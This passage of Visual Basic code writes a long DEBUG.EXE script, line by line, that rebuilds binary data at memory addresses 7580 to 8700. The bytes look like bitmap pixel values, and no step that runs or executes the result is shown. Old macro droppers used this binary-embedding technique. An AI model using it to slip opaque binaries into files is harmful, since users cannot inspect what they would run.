Print #hFile, "E 7580 27 39 62 27 3B 5E 2C 3E 5B 2D 42 58 20 34 46 10"
Print #hFile, "E 7590 26 38 2D 43 5C 35 4C 66 3A 52 6A 58 70 88 51 69"
Print #hFile, "E 75A0 7F 4A 63 77 3C 55 69 4F 69 7A 50 6A 7B 50 6A 7B"
Print #hFile, "E 75B0 6E 88 99 9C B6 C7 4C 65 79 30 49 5D 2D 46 5A 4A"
Print #hFile, "E 75C0 63 77 61 7C 91 72 8D A2 4A 63 77 40 59 6D 75 8D"
Print #hFile, "E 75D0 A1 6D 85 99 55 6E 82 41 5C 70 40 5C 6D 45 63 74"
Print #hFile, "E 75E0 70 8D 9C 5E 78 88 72 8B 9B 9B AF C0 93 A5 B6 93"
Print #hFile, "E 75F0 A2 B5 7D 8B A1 AB B9 CC 70 77 88 40 46 53 51 57"
Print #hFile, "E 7600 64 00 00 08 00 00 F6 F6 F6 EA EA EA E1 DF DF D0"
Print #hFile, "E 7610 CE CD C3 C3 C3 B7 B9 BA 00 00 03 DF E7 EE DF EB"
Print #hFile, "E 7620 F7 BE CD DD AB BD CE CD E1 F3 D4 E9 FE A5 BA CF"
Print #hFile, "E 7630 94 A8 BA A5 BA CF 78 92 AA 52 6C 84 41 59 71 4A"
Print #hFile, "E 7640 61 77 4D 62 77 68 7D 92 50 65 7A 4A 5F 75 37 4D"
Print #hFile, "E 7650 66 3B 50 6B 35 4C 66 24 3B 55 2E 42 5B 24 39 4F"
Print #hFile, "E 7660 22 32 49 20 31 46 1A 2B 3E 25 35 46 1F 2E 3E 0A"
Print #hFile, "E 7670 17 25 00 05 12 00 01 0F 00 00 0F 2D 38 4E 5B 68"
Print #hFile, "E 7680 82 71 7E 9E 70 7E A2 51 61 86 46 55 7C 3F 4E 75"
Print #hFile, "E 7690 2D 3C 63 32 3C 6B 3E 42 7D 28 27 69 11 10 52 17"
Print #hFile, "E 76A0 16 58 22 21 63 15 15 55 03 05 45 05 08 45 14 18"
Print #hFile, "E 76B0 53 29 2D 67 28 2F 66 1B 24 56 1E 28 58 2C 36 65"
Print #hFile, "E 76C0 36 41 6D 3B 49 73 4E 5F 86 58 6A 93 65 76 A1 68"
Print #hFile, "E 76D0 78 A7 5F 70 A1 55 66 99 4D 5D 92 4A 5A 8F 41 52"
Print #hFile, "E 76E0 85 3B 4D 7C 29 3B 64 1D 31 54 28 3A 57 2B 40 56"
Print #hFile, "E 76F0 23 37 49 1A 30 42 25 3B 54 35 4C 66 31 49 61 53"
Print #hFile, "E 7700 6B 83 53 6B 81 4A 63 77 3C 55 69 4B 65 76 48 62"
Print #hFile, "E 7710 73 4A 64 75 79 93 A4 74 8E 9F 3A 53 67 39 52 66"
Print #hFile, "E 7720 2E 47 5B 55 6E 82 61 7C 91 79 94 A9 46 5F 73 5C"
Print #hFile, "E 7730 75 89 68 80 94 49 61 75 66 7F 93 51 6C 80 38 54"
Print #hFile, "E 7740 65 5F 7D 8E 6D 8A 99 5F 79 89 7B 94 A4 9A AE BF"
Print #hFile, "E 7750 8E A0 B1 88 96 A8 99 A4 B8 79 80 93 50 53 62 5D"
Print #hFile, "E 7760 5D 69 53 53 5F 00 00 08 00 00 F6 F6 F6 EA EA EA"
Print #hFile, "E 7770 E1 DF DE D0 CE CD C3 C3 C3 B7 B9 B9 00 00 03 DF"
Print #hFile, "E 7780 E7 EE E8 F4 FF D2 E1 F1 A7 B9 CA B2 C6 D8 D6 EB"
Print #hFile, "E 7790 FF C2 D8 EA 9F B3 C5 95 AA BF 81 9B B3 56 70 88"
Print #hFile, "E 77A0 3F 57 6F 40 57 6D 40 55 6A 65 7A 8F 52 67 7C 45"
Print #hFile, "E 77B0 5A 70 35 4B 64 3A 4F 6A 33 4A 64 23 3A 54 2F 43"
Print #hFile, "E 77C0 5C 24 39 4F 20 30 47 1E 2F 42 13 27 39 21 34 43"
Print #hFile, "E 77D0 20 30 3C 01 0D 17 00 00 08 00 00 0A 00 00 0D 34"
Print #hFile, "E 77E0 41 57 5C 6A 86 70 7F 9F 72 80 A4 57 64 8A 3F 4B"
Print #hFile, "E 77F0 73 2B 37 5F 1A 26 4E 19 24 50 21 26 5D 1E 1F 5B"
Print #hFile, "E 7800 24 25 61 3B 3D 77 43 45 7F 26 2A 64 0B 0F 49 0B"
Print #hFile, "E 7810 0F 49 0C 11 48 0D 14 4B 09 12 44 08 12 42 12 1C"
Print #hFile, "E 7820 4B 23 2F 59 3E 4A 72 59 68 8F 4B 5C 83 57 69 92"
Print #hFile, "E 7830 64 74 A2 68 78 A7 5E 6F A0 54 65 98 4D 5D 92 4B"
Print #hFile, "E 7840 5B 90 43 54 87 39 4B 7A 2A 3C 65 25 39 5C 2E 40"
Print #hFile, "E 7850 5D 29 3E 54 1E 32 44 16 2C 3E 1D 33 4C 31 48 62"
Print #hFile, "E 7860 2F 47 5F 50 68 80 52 6A 80 4E 67 7B 42 5B 6F 51"
Print #hFile, "E 7870 6B 7C 44 5E 6F 4D 67 78 7A 94 A5 6C 86 97 3C 55"
Print #hFile, "E 7880 69 37 50 64 32 4B 5F 56 6F 83 72 8D A2 7B 96 AB"
Print #hFile, "E 7890 49 62 76 58 71 85 5D 75 89 48 60 74 67 80 94 4A"
Print #hFile, "E 78A0 65 79 46 62 73 5B 79 8A 63 80 8F 62 7C 8C 80 99"
Print #hFile, "E 78B0 A9 97 AB BC 8C 9E AF 91 9F B1 8C 94 A5 48 4D 5C"
Print #hFile, "E 78C0 55 53 5F 43 3F 4A 3C 38 43 06 03 0C 00 00 F8 F6"
Print #hFile, "E 78D0 F6 ED EB EB E2 E0 DF D1 CF CE C5 C3 C2 B9 B9 B9"
Print #hFile, "E 78E0 00 00 03 E1 EA EE DD E9 F3 E4 F4 FF B0 C2 D3 9D"
Print #hFile, "E 78F0 B1 C3 C8 DC EE CC E0 F2 A9 BD CF 93 A9 BB 8F A9"
Print #hFile, "E 7900 C1 61 7B 93 42 5A 72 37 4E 64 34 49 5E 65 7A 8F"
Print #hFile, "E 7910 57 6C 81 41 56 6C 33 49 62 38 4D 68 32 49 63 23"
Print #hFile, "E 7920 3A 54 31 45 5E 23 38 4E 1D 2D 44 1B 2C 3F 21 35"
Print #hFile, "E 7930 47 20 33 42 18 26 32 00 05 0D 00 04 0C 00 09 13"
Print #hFile, "E 7940 00 01 11 35 43 59 64 74 91 66 75 96 61 6F 93 63"
Print #hFile, "E 7950 6E 94 66 71 97 62 6D 93 57 63 8B 4B 56 82 51 58"
Print #hFile, "E 7960 8A 55 5B 90 60 66 9B 71 78 AA 76 7D AF 67 6E A0"
Print #hFile, "E 7970 5B 62 94 5D 66 98 55 5D 92 4F 58 8A 49 52 84 4C"
Print #hFile, "E 7980 59 87 51 5E 8A 52 60 8A 5F 6F 94 75 85 AA 54 65"
Print #hFile, "E 7990 8C 5C 6E 97 65 75 A3 66 76 A5 5C 6D 9E 52 63 96"
Print #hFile, "E 79A0 4B 5B 90 48 58 8D 43 54 87 36 48 77 29 3B 64 28"
Print #hFile, "E 79B0 3C 5F 31 43 60 2A 3E 57 1F 32 47 1A 2F 44 19 2F"
Print #hFile, "E 79C0 48 31 48 62 2F 47 5F 4D 65 7D 4E 66 7C 4F 68 7C"
Print #hFile, "E 79D0 45 5E 72 52 6C 7D 3F 59 6A 51 6B 7C 79 93 A4 5D"
Print #hFile, "E 79E0 77 88 3E 57 6B 33 4C 60 38 51 65 59 72 86 7E 99"
Print #hFile, "E 79F0 AE 71 8C A1 4B 64 78 5A 73 87 57 6F 83 4E 66 7A"
Print #hFile, "E 7A00 69 82 96 41 5C 70 51 6D 7E 5A 78 89 61 7E 8D 6D"
Print #hFile, "E 7A10 87 97 8B A4 B4 96 AA BB 89 9B AC 94 A1 B1 5C 63"
Print #hFile, "E 7A20 72 5B 5C 6A 48 42 4D 30 29 30 2B 27 2D 02 00 04"
Print #hFile, "E 7A30 00 00 F8 F6 F6 ED EB EA E2 E0 DF D1 CF CE C5 C3"
Print #hFile, "E 7A40 C2 B9 B9 B9 00 00 01 E5 EB F0 DC E6 F0 EC FC FF"
Print #hFile, "E 7A50 C1 D3 E4 9F B3 C5 BA CE E0 CD E1 F3 BC D0 E1 A1"
Print #hFile, "E 7A60 B7 C9 95 AF C7 70 8A A2 4A 62 7A 33 4A 60 33 48"
Print #hFile, "E 7A70 5D 6B 80 95 5B 70 85 43 58 6E 31 47 60 38 4D 68"
Print #hFile, "E 7A80 30 47 61 23 3A 54 33 47 60 22 37 4D 19 29 40 19"
Print #hFile, "E 7A90 2A 3F 31 42 55 1D 2D 3D 12 1E 28 00 0B 13 17 23"
Print #hFile, "E 7AA0 29 1F 2B 35 0F 1D 2F 49 58 72 63 72 92 62 72 96"
Print #hFile, "E 7AB0 65 72 98 72 7C A4 72 7C A4 6F 7B A3 7C 88 B0 7C"
Print #hFile, "E 7AC0 88 B2 7D 87 B6 7A 81 B2 6E 75 A6 64 6C 9B 67 6F"
Print #hFile, "E 7AD0 9E 6F 79 A8 76 80 AF 79 83 B3 7D 86 B8 7A 85 B7"
Print #hFile, "E 7AE0 75 80 B2 6D 79 A9 66 73 A1 62 70 9A 67 76 9D 6D"
Print #hFile, "E 7AF0 7E A5 65 77 A0 63 74 9F 60 70 9F 5C 6B 9C 55 66"
Print #hFile, "E 7B00 99 4D 5E 91 46 56 8B 40 51 84 3F 50 81 31 43 72"
Print #hFile, "E 7B10 26 38 61 25 38 5D 2F 41 60 2E 42 5B 29 3B 52 22"
Print #hFile, "E 7B20 37 4D 1C 32 4B 35 4C 66 32 4A 62 4A 62 7A 4A 62"
Print #hFile, "E 7B30 78 4C 65 79 43 5C 70 4E 68 79 3D 57 68 57 71 82"
Print #hFile, "E 7B40 73 8D 9E 4C 66 77 3F 58 6C 33 4C 60 42 5B 6F 5F"
Print #hFile, "E 7B50 78 8C 7A 95 AA 5B 76 8B 4B 64 78 62 7B 8F 5A 72"
Print #hFile, "E 7B60 86 5A 72 86 6D 86 9A 3F 5A 6E 47 63 74 57 75 86"
Print #hFile, "E 7B70 63 80 8F 71 8B 9B 89 A2 B2 8D A1 B2 7C 8E 9F 7C"
Print #hFile, "E 7B80 89 99 75 7B 88 50 4F 59 4C 45 4C 56 4F 54 56 50"
Print #hFile, "E 7B90 55 06 01 03 00 00 F8 F6 F5 ED EB EA E5 E1 E0 D3"
Print #hFile, "E 7BA0 D0 CC C4 C2 C1 B9 B9 B9 00 00 01 E7 ED F2 E1 EB"
Print #hFile, "E 7BB0 F5 E6 F3 FF C7 D7 E7 A8 BA CB AD C1 D3 C9 DD EF"
Print #hFile, "E 7BC0 CA DC ED 9E B4 C6 90 AA C2 7A 94 AC 52 6A 82 31"
Print #hFile, "E 7BD0 48 5E 35 4A 5F 6D 82 97 58 6D 82 44 59 6F 32 48"
Print #hFile, "E 7BE0 61 38 4D 68 2E 45 5F 22 39 53 34 48 61 21 36 4C"
Print #hFile, "E 7BF0 14 24 3B 16 27 3C 2F 3D 53 17 25 37 0D 16 23 00"
Print #hFile, "E 7C00 07 10 07 11 18 04 0E 18 06 14 27 42 53 6E 55 65"
Print #hFile, "E 7C10 89 57 66 8D 62 70 9A 77 83 AD 75 81 AB 6E 7A A4"
Print #hFile, "E 7C20 73 83 AD 71 81 AC 6B 76 A2 5C 67 93 45 50 7C 37"
Print #hFile, "E 7C30 42 6E 3E 49 75 54 5F 8B 61 6B 9A 5D 69 99 6A 75"
Print #hFile, "E 7C40 A9 75 7F B5 7A 84 BA 6F 7C B0 66 74 A5 6C 7A AA"
Print #hFile, "E 7C50 77 86 B4 7D 8D B8 6B 7B A9 5F 6F 9E 51 61 90 4B"
Print #hFile, "E 7C60 5A 8B 48 59 8C 46 57 8A 3F 50 83 38 49 7C 37 48"
Print #hFile, "E 7C70 79 2E 41 6E 26 38 61 24 37 5C 2E 40 5F 33 46 61"
Print #hFile, "E 7C80 30 41 5B 22 36 4F 20 35 50 37 4E 68 31 49 61 48"
Print #hFile, "E 7C90 60 78 47 5F 75 4A 63 77 41 5A 6E 4C 66 77 3F 59"
Print #hFile, "E 7CA0 6A 5C 76 87 66 80 91 3F 59 6A 3E 57 6B 37 50 64"
Print #hFile, "E 7CB0 4E 67 7B 68 81 95 76 91 A6 48 63 78 4D 66 7A 67"
Print #hFile, "E 7CC0 80 94 5C 74 88 63 7B 8F 6F 88 9C 44 5F 73 47 63"
Print #hFile, "E 7CD0 74 62 80 91 70 8D 9C 75 8F 9F 84 9D AD 8A 9E AF"
Print #hFile, "E 7CE0 79 8B 9C 6C 79 89 67 6A 78 3D 3C 45 4A 44 49 60"
Print #hFile, "E 7CF0 5A 5B 64 5F 60 06 01 02 00 00 F7 F5 F4 EE EC EB"
Print #hFile, "E 7D00 E5 E2 DE D3 D0 CC C4 C2 C1 B8 B8 B8 00 01 02 E9"
Print #hFile, "E 7D10 EF F4 E0 EA F4 E1 EE FC D7 E7 F7 BD CF E0 A7 BB"
Print #hFile, "E 7D20 CD BB CF E1 CE E0 F1 A9 BF D1 8B A3 BB 7F 99 B1"
Print #hFile, "E 7D30 59 71 89 31 48 5E 31 46 5B 66 7B 90 53 68 7D 45"
Print #hFile, "E 7D40 5A 70 35 4B 64 3B 50 6B 2E 45 5F 21 38 52 35 49"
Print #hFile, "E 7D50 62 20 35 4B 11 21 38 17 25 3B 30 3D 53 1C 25 39"
Print #hFile, "E 7D60 11 17 24 06 0B 14 00 00 09 00 00 0A 16 23 39 4E"
Print #hFile, "E 7D70 5D 7D 43 54 7B 45 55 80 5B 6B 96 7F 8C B8 8B 98"
Print #hFile, "E 7D80 C4 83 90 BC 74 85 B0 63 74 9F 5E 6C 96 48 54 7C"
Print #hFile, "E 7D90 32 3E 66 2B 37 5F 34 40 68 47 56 7D 5A 67 93 5F"
Print #hFile, "E 7DA0 6C 9A 62 6D 9F 69 75 AB 75 81 B7 79 85 BB 78 85"
Print #hFile, "E 7DB0 B9 7D 8B BC 7E 8C BC 76 85 B3 5D 6D 9C 50 60 8F"
Print #hFile, "E 7DC0 43 52 83 3E 4D 7E 3E 4F 82 40 51 84 3B 4C 7F 35"
Print #hFile, "E 7DD0 46 77 32 44 73 2A 3D 6A 27 39 62 26 39 5E 2E 40"
Print #hFile, "E 7DE0 5F 35 47 64 31 42 5D 1F 33 4C 22 37 52 34 4B 65"
Print #hFile, "E 7DF0 2C 44 5C 45 5D 75 48 60 76 49 62 76 41 5A 6E 4D"
Print #hFile, "E 7E00 67 78 43 5D 6E 5F 79 8A 57 71 82 3B 55 66 3E 57"
Print #hFile, "E 7E10 6B 40 59 6D 59 72 86 70 89 9D 74 8F A4 44 5F 74"
Print #hFile, "E 7E20 55 6E 82 64 7D 91 55 6D 81 66 7E 92 6C 85 99 4B"
Print #hFile, "E 7E30 66 7A 53 6F 80 68 86 97 6E 8B 9A 73 8D 9D 7E 97"
Print #hFile, "E 7E40 A7 80 94 A5 72 84 95 64 71 81 36 3A 45 5F 5F 65"
Print #hFile, "E 7E50 50 4B 4D 4D 48 47 52 4E 4D 0C 09 05 00 00 F7 F5"
Print #hFile, "E 7E60 F4 EE EC EB E6 E3 DF D3 D0 CC C3 C2 BE B8 B9 B7"
Print #hFile, "E 7E70 00 02 03 EB F1 F6 E2 EC F6 DB E8 F6 DB EB FB D6"
Print #hFile, "E 7E80 E8 F9 B8 CC DE B6 CA DC CE E0 F1 C3 D9 EB 8D A5"
Print #hFile, "E 7E90 BD 85 9F B7 62 7A 92 35 4C 62 29 3E 53 5D 72 87"
Print #hFile, "E 7EA0 53 68 7D 4B 60 76 39 4F 68 3E 53 6E 2E 45 5F 20"
Print #hFile, "E 7EB0 37 51 36 4A 63 1F 34 4A 0E 1E 35 16 24 3A 31 3B"
Print #hFile, "E 7EC0 53 1D 23 3A 0A 0D 1C 06 08 13 00 00 08 00 00 0B"
Print #hFile, "E 7ED0 2A 36 4E 46 55 76 41 51 7B 49 59 87 68 77 A5 82"
Print #hFile, "E 7EE0 91 BF 86 95 C3 7B 8A B8 65 78 A5 5B 6E 99 5C 6E"
Print #hFile, "E 7EF0 93 4A 5B 7C 39 4A 6B 2B 3C 5D 21 32 53 2A 3A 5E"
Print #hFile, "E 7F00 3F 4E 75 48 58 83 5A 68 98 62 6F A3 70 7C B2 77"
Print #hFile, "E 7F10 85 BA 77 85 B9 78 88 B7 6F 7F AD 5B 6B 99 4B 5B"
Print #hFile, "E 7F20 8A 47 56 87 42 50 84 41 4F 83 3F 50 83 3E 4F 82"
Print #hFile, "E 7F30 3B 4C 7D 38 49 7A 33 45 74 25 38 63 20 32 5B 23"
Print #hFile, "E 7F40 36 5B 2B 3C 5D 33 45 62 35 46 61 28 3B 56 26 3B"
Print #hFile, "E 7F50 56 32 49 63 27 3F 57 44 5C 74 49 61 77 49 62 76"
Print #hFile, "E 7F60 3F 58 6C 4E 68 79 46 60 71 60 7A 8B 48 62 73 3F"
Print #hFile, "E 7F70 59 6A 41 5A 6E 4C 65 79 61 7A 8E 73 8C A0 6D 88"
Print #hFile, "E 7F80 9D 47 62 77 60 79 8D 5F 78 8C 4E 66 7A 69 81 95"
Print #hFile, "E 7F90 6A 83 97 4E 69 7D 5E 7A 8B 59 77 88 57 74 83 6D"
Print #hFile, "E 7FA0 87 97 7B 94 A4 6E 82 93 5F 71 82 5B 68 76 47 4E"
Print #hFile, "E 7FB0 57 49 4A 4E 4C 47 48 44 3F 3E 49 46 42 04 04 00"
Print #hFile, "E 7FC0 00 00 F5 F6 F4 EC ED EB E4 E2 E1 D1 CF CE C3 C1"
Print #hFile, "E 7FD0 C0 B8 B8 B8 00 02 03 EB F1 F6 DE E9 F1 BE CC D8"
Print #hFile, "E 7FE0 B6 C7 D4 CC DF EE C6 D8 E9 B5 C7 D8 BE D0 E1 C0"
Print #hFile, "E 7FF0 D4 E5 94 AD C1 8A A5 BA 6A 82 98 3A 51 67 23 3B"
Print #hFile, "E 8000 4F 57 6F 83 57 6C 81 51 66 7B 3E 52 6B 40 56 6F"
Print #hFile, "E 8010 2F 44 5F 21 36 51 36 49 64 20 31 4B 0D 1D 34 17"
Print #hFile, "E 8020 24 3A 25 30 46 15 1C 2F 02 05 13 0B 0B 17 00 00"
Print #hFile, "E 8030 0D 00 02 15 47 52 6E 4C 5A 7E 54 64 8F 4C 5C 8B"
Print #hFile, "E 8040 5C 6A 9B 71 7F B0 85 93 C4 86 95 C6 6A 7C AB 5A"
Print #hFile, "E 8050 6D 9A 51 62 89 51 61 86 4C 5C 80 37 47 6B 1B 2B"
Print #hFile, "E 8060 50 19 29 4E 26 36 60 2C 3C 67 2C 3A 6A 48 56 87"
Print #hFile, "E 8070 68 75 A9 6F 7D B1 69 77 A8 69 77 A7 61 70 9E 4C"
Print #hFile, "E 8080 5B 89 42 52 81 46 55 86 4B 59 8D 4B 59 8D 47 55"
Print #hFile, "E 8090 89 3F 50 83 3E 4C 80 3C 4D 7E 39 49 78 22 32 60"
Print #hFile, "E 80A0 17 28 53 1C 2F 55 23 36 57 2F 44 60 39 4C 67 35"
Print #hFile, "E 80B0 4B 64 2B 40 5B 33 4A 64 25 3D 55 44 5C 74 49 61"
Print #hFile, "E 80C0 77 47 5F 75 3C 55 69 4C 66 77 47 61 72 5F 79 8A"
Print #hFile, "E 80D0 40 5A 6B 43 5D 6E 43 5C 70 54 6D 81 64 7D 91 74"
Print #hFile, "E 80E0 8D A1 65 7E 92 4B 64 78 69 82 96 5F 77 8B 4D 65"
Print #hFile, "E 80F0 79 6E 86 9A 69 82 96 50 69 7D 73 8F A0 59 75 86"
Print #hFile, "E 8100 51 6D 7E 7C 96 A6 8E A7 B7 70 84 95 5D 6F 80 63"
Print #hFile, "E 8110 70 7E 77 7E 87 4A 4D 51 48 46 46 53 4F 4E 57 56"
Print #hFile, "E 8120 52 02 01 00 00 00 F3 F6 F4 EE F1 EF DD DE DC D6"
Print #hFile, "E 8130 D6 D6 C2 C2 C2 B5 B7 B8 00 02 06 B4 BA BF AB B7"
Print #hFile, "E 8140 BD A8 B8 BF A4 B5 BE C3 D5 E0 B8 C9 D6 B0 C1 CE"
Print #hFile, "E 8150 C1 D2 DF C4 D7 E6 AA C1 D0 82 9B AB 6F 88 9C 4C"
Print #hFile, "E 8160 65 79 2C 44 5A 43 5C 70 5D 72 87 59 6C 81 41 54"
Print #hFile, "E 8170 69 44 56 6D 30 43 5E 25 37 54 2E 40 5D 17 25 41"
Print #hFile, "E 8180 14 20 38 1B 26 3A 23 32 42 0A 18 24 06 0A 15 03"
Print #hFile, "E 8190 04 12 00 00 0E 1D 21 3D 54 5D 82 52 60 8A 5B 68"
Print #hFile, "E 81A0 96 5F 6B 9B 5E 69 9D 5F 6B A1 66 71 AA 77 83 B9"
Print #hFile, "E 81B0 69 74 A8 66 71 A3 62 70 A1 57 65 96 4F 5D 8D 4E"
Print #hFile, "E 81C0 5C 8C 4C 5A 8A 26 34 64 00 02 32 00 00 31 1B 26"
Print #hFile, "E 81D0 58 2F 3A 6C 50 5B 8D 68 76 A6 64 70 A0 4B 58 86"
Print #hFile, "E 81E0 41 4E 7C 45 52 80 53 61 91 52 60 91 4F 5D 8E 4B"
Print #hFile, "E 81F0 59 8A 4A 57 8B 49 57 8B 46 53 87 40 4E 82 39 46"
Print #hFile, "E 8200 7A 28 37 68 1B 2B 59 17 29 52 1B 2F 52 3B 51 6D"
Print #hFile, "E 8210 3A 52 6A 35 4D 63 2A 42 5A 2F 47 5F 2E 46 5E 4A"
Print #hFile, "E 8220 62 7A 4B 63 79 3D 55 6B 3B 53 69 4B 64 78 4D 66"
Print #hFile, "E 8230 7A 54 6D 81 42 5B 6F 44 5D 71 4A 64 75 62 7C 8D"
Print #hFile, "E 8240 6F 89 9A 6B 85 96 51 6A 7A 56 6F 7F 70 89 99 5D"
Print #hFile, "E 8250 75 87 55 6D 7F 71 89 9B 61 7A 8E 5A 73 87 6C 85"
Print #hFile, "E 8260 99 4C 66 77 5A 74 85 88 A1 B1 79 90 A0 63 7A 89"
Print #hFile, "E 8270 69 7E 8D 4F 5F 6B 87 8E 97 5B 5E 63 43 42 44 58"
Print #hFile, "E 8280 56 56 4B 4C 4A 07 08 06 00 00 F3 F8 F6 EC F1 EF"
Print #hFile, "E 8290 D9 DB DB D1 D3 D3 C0 C2 C3 B4 B8 B9 00 00 04 A9"
Print #hFile, "E 82A0 AF B4 C3 CF D5 D2 E2 E8 B8 C9 D2 BA CD D5 BB CD"
Print #hFile, "E 82B0 D8 B1 C3 CE B3 C3 D0 C1 D2 DF B2 C8 D4 8C A6 B4"
Print #hFile, "E 82C0 6F 89 9A 55 70 84 44 5F 74 4F 67 7D 56 6B 80 58"
Print #hFile, "E 82D0 6C 7E 49 5A 6F 45 57 6E 31 42 5D 25 37 54 30 40"
Print #hFile, "E 82E0 5D 17 25 41 17 21 39 21 2D 3F 1C 2D 3A 08 19 22"
Print #hFile, "E 82F0 07 0D 18 00 00 0B 00 00 12 2E 33 54 5C 65 90 51"
Print #hFile, "E 8300 60 8E 52 5F 8D 62 6E 9E 68 73 A7 56 62 98 39 45"
Print #hFile, "E 8310 7F 5B 66 9F 88 90 C5 8E 97 C9 91 9D D3 89 96 CE"
Print #hFile, "E 8320 78 84 BA 69 75 AB 73 7F B5 73 7F B5 5C 69 9D 59"
Print #hFile, "E 8330 66 9A 69 74 A6 58 63 95 47 52 84 4F 5B 8B 47 53"
Print #hFile, "E 8340 83 35 42 70 47 53 83 5E 6A 9A 57 65 96 54 62 93"
Print #hFile, "E 8350 55 62 96 56 63 97 50 5D 91 47 54 88 48 54 8A 50"
Print #hFile, "E 8360 5C 92 3E 4A 80 2C 39 6D 1C 2C 5B 14 25 50 14 2A"
Print #hFile, "E 8370 4E 36 4E 6C 3A 54 6C 39 54 69 2C 44 5C 2F 47 5F"
Print #hFile, "E 8380 2A 42 5A 44 5C 74 48 60 76 41 59 6F 41 59 6F 4E"
Print #hFile, "E 8390 66 7C 52 6B 7F 56 6F 83 43 5C 70 47 60 74 50 6A"
Print #hFile, "E 83A0 7B 6C 86 97 73 8D 9E 60 7A 8A 51 68 78 5E 75 84"
Print #hFile, "E 83B0 70 87 97 68 81 91 52 6A 7C 72 8A 9C 5F 78 8C 60"
Print #hFile, "E 83C0 79 8D 5A 73 87 3F 59 6A 66 7E 90 8E A7 B7 8C A3"
Print #hFile, "E 83D0 B2 91 A8 B7 9D B3 BF 9B AB B7 B2 BB C4 4B 4F 54"
Print #hFile, "E 83E0 18 1A 1B 50 50 50 64 64 64 00 00 00 00 00 F7 FC"
Print #hFile, "E 83F0 FA EE F3 F1 D8 DA DA CD CF CF C1 C3 C4 BA BE BF"
Print #hFile, "E 8400 00 01 06 AC B2 B7 BB C7 CD DC EC F2 BD CE D7 B6"
Print #hFile, "E 8410 C9 D1 CE E0 EB CF E1 EC BC CC D9 C3 D4 E1 BE D2"
Print #hFile, "E 8420 DD 95 AD B9 60 7A 8B 47 62 76 48 63 78 53 6B 81"
Print #hFile, "E 8430 4F 67 7B 53 66 7B 51 62 77 44 56 6D 31 42 5D 24"
Print #hFile, "E 8440 36 53 30 41 5C 1A 27 41 16 21 37 28 34 46 25 36"
Print #hFile, "E 8450 43 09 19 25 0A 10 1D 00 00 0F 06 08 26 47 4D 72"
Print #hFile, "E 8460 5D 6A 96 54 64 93 5D 6B 9B 63 71 A1 6A 77 AB 64"
Print #hFile, "E 8470 70 A6 3F 4C 84 63 71 A6 AB B7 E7 B5 BF EF AE BA"
Print #hFile, "E 8480 F0 B6 C1 FA A3 AF E5 7D 89 BF 79 85 BB 8A 96 CC"
Print #hFile, "E 8490 90 9D D1 95 A2 D6 8E 9B CF 6F 7D AE 37 45 76 2A"
Print #hFile, "E 84A0 38 69 33 41 72 42 50 80 60 6E 9F 62 70 A1 62 6F"
Print #hFile, "E 84B0 A3 62 70 A4 64 72 A7 65 73 A8 60 6E A3 56 64 99"
Print #hFile, "E 84C0 4F 5C 94 4D 5A 92 42 4F 87 30 3E 73 1E 2D 5E 12"
Print #hFile, "E 84D0 23 4E 0F 25 49 32 4A 68 3C 56 6E 40 5B 70 2E 46"
Print #hFile, "E 84E0 5E 31 49 61 28 40 58 3F 57 6F 47 5F 75 46 5E 74"
Print #hFile, "E 84F0 45 5D 73 4E 66 7C 4F 68 7C 57 70 84 4B 64 78 4F"
Print #hFile, "E 8500 68 7C 53 6D 7E 71 8B 9C 77 91 A2 5B 75 85 53 6A"
Print #hFile, "E 8510 7A 66 7D 8C 6E 87 97 6D 86 96 54 6C 7E 70 8A 9B"
Print #hFile, "E 8520 60 79 8D 64 7D 91 58 72 83 45 5F 70 76 8E A0 85"
Print #hFile, "E 8530 9E AE 73 8A 99 74 89 98 66 79 86 66 76 82 8D 96"
Print #hFile, "E 8540 9F 43 47 4C 06 08 09 1C 1E 1E 50 52 52 00 00 00"
Print #hFile, "E 8550 00 00 F3 F8 F6 ED F2 F0 DB DD DD CD CF CF C1 C3"
Print #hFile, "E 8560 C4 B9 BD BE 00 00 04 AF B5 BA 97 A3 A9 AB BB C1"
Print #hFile, "E 8570 9F B0 B9 A8 BB C3 C3 D5 E0 D3 E5 F0 C0 D0 DD B6"
Print #hFile, "E 8580 C7 D4 C5 D9 E4 9A B2 BE 57 71 82 3D 58 6C 3F 59"
Print #hFile, "E 8590 71 55 6D 83 57 6E 84 4F 64 79 52 65 7A 41 53 6A"
Print #hFile, "E 85A0 2F 42 5D 23 36 51 32 40 5C 1A 27 41 12 1D 33 29"
Print #hFile, "E 85B0 35 47 27 37 47 00 0B 18 00 03 12 00 00 14 18 1B"
Print #hFile, "E 85C0 3A 48 4E 77 47 55 85 46 5A 8A 54 65 96 5A 69 9A"
Print #hFile, "E 85D0 6A 78 AC 75 83 B7 57 67 9C 5E 6C A0 9C A9 D7 BC"
Print #hFile, "E 85E0 C9 F7 B3 BE F2 C2 CD FF BB C7 FD 96 A2 D8 7D 89"
Print #hFile, "E 85F0 BF 82 8E C4 91 9E D2 9C A9 DD 7E 8B BF 60 6D A1"
Print #hFile, "E 8600 2E 3B 6F 29 37 68 41 4E 82 54 63 94 5A 68 99 40"
Print #hFile, "E 8610 4E 82 48 56 8B 50 60 95 57 65 9A 57 67 9C 61 6F"
Print #hFile, "E 8620 A4 66 75 AD 5E 6B A3 4C 59 91 46 53 8B 35 43 78"
Print #hFile, "E 8630 23 32 63 14 25 50 0D 23 47 2F 47 65 3D 56 70 45"
Print #hFile, "E 8640 60 75 2F 47 5F 33 4B 63 2A 42 5A 40 58 70 4A 62"
Print #hFile, "E 8650 78 4A 62 78 46 5E 74 48 60 76 4A 63 77 56 6F 83"
Print #hFile, "E 8660 56 6F 83 56 6F 83 50 6A 7B 6E 88 99 75 8F A0 5C"
Print #hFile, "E 8670 76 87 5B 74 84 6C 83 92 72 8B 9B 61 7A 8A 5B 75"
Print #hFile, "E 8680 86 6A 84 95 68 81 95 5C 75 89 48 62 73 48 62 73"
Print #hFile, "E 8690 77 90 A0 81 98 A8 6C 81 90 5D 73 7F 45 58 65 3D"
Print #hFile, "E 86A0 4D 59 85 8E 97 39 3F 44 00 00 01 12 17 16 6C 6E"
Print #hFile, "E 86B0 6E 00 02 01 00 00 ED F2 F0 EC F1 EF DF E1 E1 D0"
Print #hFile, "E 86C0 D2 D2 BF C1 C2 B2 B6 B7 00 00 04 B5 BB C0 CA D6"
Print #hFile, "E 86D0 DC B5 C5 CB BD CE D7 CF E2 EA BC CE D9 C0 D2 DD"
Print #hFile, "E 86E0 C1 D1 DE BC CD DA C4 D8 E3 9C B4 C0 64 7E 8F 54"
Print #hFile, "E 86F0 6F 83 42 5E 76 55 70 85 64 7B 91 57 6C 81 53 66"
Print #hFile, "E 8700 7B 3F 51 68 31 45 5E 22 35 50 31 3F 5B 1C 2A 41"
